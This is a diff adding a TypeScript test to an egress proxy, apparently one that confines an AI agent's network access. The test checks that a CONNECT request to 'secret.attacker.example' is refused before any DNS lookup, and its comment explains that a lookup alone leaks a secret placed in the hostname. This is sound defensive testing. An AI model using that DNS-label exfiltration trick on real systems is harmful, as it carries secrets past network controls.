@@ -7,6 +7,7 @@ import type { AddressInfo } from 'node:net';
 import {
   chromiumProxyArgs,
   createEgressProxy,
+  createPinnedLookup,
   requestThroughPolicy,
 } from '../src/index.ts';
 
@@ -400,4 +401,48 @@ test('a CONNECT authority with a bracketed IPv6 host is parsed, not split on eve
   // And the ordinary form still parses as it did.
   await connect('nothing.invalid:443');
   assert.match(proxy.refusals.at(-1) ?? '', /nothing\.invalid/);
+});
+
+test('a host outside onlyHosts is refused before its name is looked up, on every path that dials', async (t) => {
+  // The lookup is a request too: `<secret>.attacker.example` hands its
+  // first label to that zone's nameserver whether or not anything connects.
+  const looked: string[] = [];
+  const proxy = await createEgressProxy({ onlyHosts: ['docs.python.org'] }, {
+    lookup: async (hostname) => {
+      looked.push(hostname);
+      return [{ address: '93.184.216.34', family: 4 }];
+    },
+  });
+  t.after(() => proxy.close());
+
+  const status = await new Promise<number>((resolve, reject) => {
+    const request = http.request({
+      host: '127.0.0.1',
+      port: proxy.port,
+      method: 'CONNECT',
+      path: 'secret.attacker.example:443',
+    });
+    request.on('connect', (response, socket) => {
+      socket.destroy();
+      resolve(response.statusCode ?? 0);
+    });
+    request.on('response', (response) => {
+      response.resume();
+      resolve(response.statusCode ?? 0);
+    });
+    request.on('error', reject);
+    request.end();
+  });
+  assert.equal(status, 403);
+  assert.deepEqual(looked, []);
+  assert.match(proxy.refusals.at(-1) ?? '', /secret\.attacker\.example is not one of the hosts this agent may reach/);
+
+  // The pinned lookup Node's own requests use refuses the same way. The
+  // name does not exist, so a lookup that had run would fail with ENOTFOUND
+  // instead of the policy's refusal.
+  const lookup = createPinnedLookup({ onlyHosts: ['docs.python.org'] });
+  const error = await new Promise<Error | null>((resolve) => {
+    lookup('secret.attacker.invalid', { all: true }, (failure) => resolve(failure));
+  });
+  assert.match(error?.message ?? '', /is not one of the hosts this agent may reach/);
 });
